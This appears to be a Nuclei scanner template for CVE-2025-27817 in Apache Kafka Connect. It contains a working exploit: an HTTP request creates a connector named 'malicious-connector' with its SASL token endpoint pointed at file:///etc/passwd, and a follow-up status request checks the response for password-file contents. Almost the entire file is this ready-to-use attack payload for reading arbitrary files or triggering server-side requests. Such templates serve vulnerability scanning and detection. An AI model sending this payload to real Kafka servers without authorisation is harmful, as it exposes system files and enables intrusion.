id: kafka-CVE-2025-27817-ReadAnyFileOrSSRF

info:
  name: kafka-CVE-2025-27817-ReadAnyFileOrSSRF
  author: iSee857
  severity: high
  description: |
    kafka-CVE-2025-27817-ReadAnyFileOrSSRF.

http:
  - raw:
      - |
        POST /connectors HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
        "name": "malicious-connector",
        "config": {
        "connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
        "tasks.max": "1",
        "source.cluster.alias": "source-0",
        "target.cluster.alias": "target-0",
        "source.cluster.bootstrap.servers": "127.0.0.1:9092",
        "target.cluster.bootstrap.servers": "127.0.0.1:9092",
        "producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd",
        "producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginCallbackHandler",
        "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required serviceName=\"exploit\";",
        "producer.override.sasl.mechanism": "OAUTHBEARER",
        "value.converter": "org.apache.kafka.connect.converters.ByteArrayConverter",
        "key.converter": "org.apache.kafka.connect.converters.ByteArrayConverter"
          }
        }

      - |
        GET /connectors/malicious-connector/status HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - root:x
          - sbin
        condition: and

      - type: status
        status:
          - 200